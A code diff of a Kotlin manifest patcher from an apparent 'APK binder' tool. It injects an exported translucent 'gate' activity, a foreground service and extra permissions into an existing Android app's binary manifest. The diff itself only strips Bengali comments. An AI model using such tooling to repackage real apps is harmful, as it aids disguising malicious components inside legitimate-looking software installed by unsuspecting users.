@@ -1,4 +1,4 @@
-Package com.devhs.apkbinder.binder
+package com.devhs.apkbinder.binder
 
 import java.io.ByteArrayOutputStream
 
@@ -17,7 +17,7 @@ object AxmlPatcher {
     const val ATTR_NAME = 0x01010003
     const val ATTR_THEME = 0x01010000
     const val ATTR_FG_TYPE = 0x01010599
-    const val ATTR_EXPORTED = 0x0101001d // নতুন: সার্ভিস ও অ্যাক্টিভিটির এক্সপোর্টেড ফিক্স করার জন্য
+    const val ATTR_EXPORTED = 0x0101001d
     const val STYLE_TRANSLUCENT = 0x0103000b
 
     sealed class Value {
@@ -357,7 +357,7 @@ object AxmlPatcher {
         added.add("name")
         added.add("theme")
         added.add("foregroundServiceType")
-        added.add("exported") // নতুন স্ট্রিং স্লটের জন্য যোগ করা হলো
+        added.add("exported")
         added.add(ANDROID_NS)
         added.add("activity")
         added.add("service")
@@ -374,7 +374,7 @@ object AxmlPatcher {
         attrIds[slot(0)] = ATTR_NAME
         attrIds[slot(1)] = ATTR_THEME
         attrIds[slot(2)] = ATTR_FG_TYPE
-        attrIds[slot(3)] = ATTR_EXPORTED // রিসোর্স ম্যাপে আইডি ম্যাপ করার জন্য
+        attrIds[slot(3)] = ATTR_EXPORTED
 
         val withStrings = appendStrings(xml, added, attrIds)
         val pool = readPool(withStrings, 8)
@@ -407,13 +407,13 @@ object AxmlPatcher {
             appendAttr(application, one.toByteArray())
         }
 
-        // activity + service যোগ (application-এর শুরুতে) - এখানে সার্ভিসে exported ও fgType ঠিক করা হয়েছে
+        // activity + service যোগ
         val gate = makeElement(
             slot(5),
             listOf(
                 Attr(slot(0), Value.Str(slot(9))),
                 Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT)),
-                Attr(slot(3), Value.Dec(1)) // Activity exported=true
+                Attr(slot(3), Value.Dec(1))
             )
         )
         val service = makeElement(
@@ -421,13 +421,13 @@ object AxmlPatcher {
             listOf(
                 Attr(slot(0), Value.Str(slot(10))),
                 Attr(slot(2), Value.Dec(1)),
-                Attr(slot(3), Value.Dec(0)) // Service exported=false (সিকিউরিটি ঠিক রাখার জন্য)
+                Attr(slot(3), Value.Dec(0))
             )
         )
         application.children.add(0, service)
         application.children.add(0, gate)
 
-        // পারমিশন যোগ (manifest-এ, application-এর আগে)
+        // পারমিশন যোগ
         val index = manifest.children.indexOf(application)
         for (i in 0 until permissions.size) {
             val perm = makeElement(slot(7), listOf(Attr(slot(0), Value.Str(slot(11) + i))))
